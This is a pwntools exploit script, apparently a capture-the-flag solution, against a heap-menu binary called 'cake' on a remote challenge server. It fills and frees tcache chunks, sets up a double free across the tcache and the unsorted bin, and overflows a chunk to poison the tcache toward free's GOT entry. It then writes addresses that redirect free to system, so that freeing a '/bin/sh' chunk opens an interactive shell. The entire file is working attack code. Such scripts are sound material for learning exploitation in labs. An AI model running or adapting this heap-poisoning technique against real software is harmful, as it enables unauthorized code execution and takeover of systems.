from pwn import *
import time

DEBUG = False
if DEBUG:
    p = process(['./cake'])
else:
    #p = remote("localhost", 54321)
    p = remote('remote16.goatskin.kr', 13200)
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

hehe = 0x400b8b
system = 0x400770
puts = 0x400750
free_plt = 0x400740
free_got = 0x602018


p.sendlineafter("> ", "5")
p.sendlineafter("> ", "aa")

#p.sendline("5")
#p.sendline("aa")

for i in range(10):
    p.sendlineafter("> ", "1")
    p.sendlineafter("> ", str(i))
    p.sendlineafter("> ", "S")
    p.sendline("ZZZZZZZ")

for i in range(7):
    p.sendlineafter("> ", "2")
    p.sendlineafter("> ", str(i))

p.sendlineafter("> ", "2")
p.sendlineafter("> ", "8")  # b
p.sendlineafter("> ", "2")
p.sendlineafter("> ", "7")  # a, consolidated

p.sendlineafter("> ", "1")  # chunk from tcache
p.sendlineafter("> ", "10")
p.sendlineafter("> ", "S")
p.send("/bin/sh\x00")

print("hehehe")

p.sendlineafter("> ", "2")
p.sendlineafter("> ", "8")  # free b again
# now b is in tcache and unsorted bin both

p.sendlineafter("> ", "1")  # chunk from unsortedbin
p.sendlineafter("> ", "11")
p.sendlineafter("> ", "L")
#p.send("B" * 0x10)
p.send("B" * 0x100 + "\x00" * 8 + p64(0x111) + p64(free_got))

#gdb.attach(p)

p.sendlineafter("> ", "1")  # for lining
p.sendlineafter("> ", "12")
p.sendlineafter("> ", "S")
p.send("AAAAAAAA")
#p.send("/bin/sh\x00")
#p.send(p64(free_got)+p64(free_got+8))

#time.sleep(20)

#gdb.attach(p)

#time.sleep(30)

p.sendlineafter("> ", "1")  # evil code
p.sendlineafter("> ", "13")
p.sendlineafter("> ", "S")
#p.send("BBBB")

#gdb.attach(p)

p.send("\x76\x07\x40\x00\x00\x00\x00\x00\x56\x07\x40\x00\x00\x00\x00\x00")
#p.send("\x8b\x0b\x40\x00\x00\x00")
# 0x400b8b

#gdb.attach(p)
#input()
#time.sleep(20)

p.sendlineafter("> ", "2")  # getcha
p.sendlineafter("> ", "10")

p.interactive()